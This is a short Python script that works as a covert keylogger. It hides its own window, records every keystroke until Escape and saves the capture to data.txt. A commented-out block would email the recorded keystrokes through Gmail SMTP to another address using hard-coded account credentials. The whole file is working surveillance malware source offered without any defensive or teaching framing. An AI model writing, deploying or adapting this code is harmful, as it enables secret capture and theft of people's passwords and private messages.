import win32gui, win32con, keyboard, smtplib
the_program_to_hide = win32gui.GetForegroundWindow()
win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
a = str(keyboard.record(until='esc'))

a = a.replace('KeyboardEvent', '')
a = a.replace('down', '')
a = a.replace('(', '')
a = a.replace(')', '')
a = a.replace('[', '')
a = a.replace(']', '')
a = a.replace(', esc', '')
a=a.replace('up', '(extra)')

'''
sender_email = "programmingtest73@gmail.com"
rec_email = "programmingtest75@gmail.com"
password = "passofsendemail"
message = a

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(sender_email, password)
print("Login success")
server.sendmail(sender_email, rec_email, message)
print("Email has been sent to ", rec_email)'''

file = open('data.txt', 'w')
file.write(a)
file.close()
